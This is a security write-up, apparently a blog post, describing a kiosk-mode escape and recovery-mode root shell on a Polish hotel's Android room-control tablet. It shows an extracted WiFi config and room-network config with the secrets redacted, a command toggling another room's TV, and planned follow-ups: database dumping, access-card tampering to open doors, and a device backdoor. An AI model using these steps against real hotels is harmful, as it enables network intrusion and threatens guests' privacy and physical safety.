## Pwning H.E.S (Hotel Entertainment System)

Long story short: there is an interesting hotel in Poland that is IoT enabled in a way that the TV network, the lights, the heating system and the room service can be controlled from an Android tablet. Due to lack of hardening (kiosk mode) of the tablet, a third party can gain unauthorized access to the underlying OS of the device, obtain WPA2 WiFI credentials to a private network (not the guest WiFi) and once placed in the correct network segment interact/tamper with devices outside their room (e.g. turn on/off any TV, adjust volume, switch channel).

#### 1. Target info
- tablet is “locked” to use only one custom made app
- home button (locked)
- control over: TV / heating / room service / lights
- GOAL: attempt to get to main screen / modify settings / info disclosure / shell?

#### 2. First attempts
- ADB via USB (didn't work w/o correct ADB keys – pop-up dialog blocked)
- home button "brute force" (press harder and faster to make it work) 
- other weird swiping combos
 
#### 3. The custom app
- has an embedded browser via `VebView` component (with URL bar for user input)
- to type you get a virtual keyboard on screen
- the keyboard has Settings option (Android settings menu)
- toggle button for full Settings menu access (still not on Home screen)

#### 4. Networking settings
- tablet is connected to a “private” WPA2 network (get PSK from tablet?) 
- static IP config (will have to use on our box later)
- we can't yet set a proxy because we are not on the same WLAN (guest network with OPEN WiFi :( )
- attempt to access the ADB shell over the network once on WLAN

#### 5. Press moar buttons
- Android recovery menu (find the correct key combo when booting the device)
- turn off the device
- press and hold Volume UP key + Home Key
- press and hold Power key

#### 6. TWRP Recovery
- ADB shell via USB works automagically (r00t shell)
- access to root fliesystem / adb push - adb pull
- app-XXXXX-release-1.5.5.apk
- interesting files: `wpa_supplicant.conf`
```
ctrl_interface=wlan0
update_config=1
device_name=[NOLOGSNOCRIME]
manufacturer=samsung
model_name=GT-P5210
model_number=GT-P5210
serial_number=[NOLOGSNOCRIME]
device_type=[NOLOGSNOCRIME]
config_methods=physical_display virtual_push_button keypad
p2p_listen_reg_class=81
p2p_listen_channel=1
p2p_oper_reg_class=115
p2p_oper_channel=48

network={
	ssid="[NOLOGSNOCRIME]"
	scan_ssid=1
	psk="[NOLOGSNOCRIME]"
	key_mgmt=WPA-PSK
	priority=2
	autojoin=1
	frequency=2422
}
```
- app config
```
{
  "location": "[NOLOGSNOCRIME]",
  "alarmEnabled": true,
  "stbPort": 8765,
  "plcPort": 1202,
  "middlewareIp": "10.3.30.10",
  "ntp": "10.3.20.13",
  "roomService": {
    "ip": "192.168.56.113:1810",
    "dbName": "[NOLOGSNOCRIME]",
    "user": "sa",
    "password": "[NOLOGSNOCRIME]",
    "enabled": true
  },
  "sip": {
    "domain": "[NOLOGSNOCRIME]",
    "usernamePrefix": "[NOLOGSNOCRIME]",
    "password": "[NOLOGSNOCRIME]",
    "port": 6050,
    "protocol": "UDP",
    "authCode": "[NOLOGSNOCRIME]",
    "prepaid": true
  },
  "servicePhones": {
    "housekeeping": "179",
    "reception": "197",
    "tech": "177"
  },

  "rooms": [
    {"ip": "10.3.10.22",    "number": "101",    "stbIp": "10.3.30.16"},
    {"ip": "10.3.10.25",    "number": "102",    "stbIp": "10.3.30.17"},
    {"ip": "10.3.10.28",    "number": "103",    "stbIp": "10.3.30.18"},
....
    {"ip": "10.3.11.176",    "number": "450",    "stbIp": "10.3.30.154"},
...
    {"ip": "10.3.11.201",    "number": "181",    "plcIp": "10.3.11.193",    "layout": 4,    "name": "[NOLOGSNOCRIME]",  "sipPassword": "[NOLOGSNOCRIME]"},
    {"ip": "10.3.11.202",    "number": "182",    "plcIp": "10.3.11.193",    "layout": 4,    "name": "[NOLOGSNOCRIME]",  "sipPassword": "[NOLOGSNOCRIME]"},
    {"ip": "10.3.11.203",    "number": "183",    "plcIp": "10.3.11.193",    "layout": 4,    "name": "[NOLOGSNOCRIME]",  "sipPassword": "[NOLOGSNOCRIME]"}
  ]
```

#### 7. What's been achieved
- PSK for WiFi & IP/MAC address of device (we become the Android tablet)
- config file with creds and IPs of other rooms
- APK file with API endpoints
```java
case R.id.b_tv_off_on:
...
	Global.read_withoutjoin("http://" + Global.getConfig().getStbIp() + "/toggle_power.json");
```
- third party can manipulate TV state
```
$ http POST http://10.3.30.16:8765/toggle_power.json -b
```

#### 8. Other affairs (a.k.a. to be continued)
- fingerprint other services/hosts in the private WLAN
- enumerate content of the Room Service database using `sa` user (MSSQL System Admin)
- find the booking/management system (validate/invalidate access cards)
  * associate your access card identifier with any room in the hotel to open doors?
- plant a backdoor on the Android device to access camera/microphone? (lame)
- order Room Service for your room on behalf of someone else? (lame)
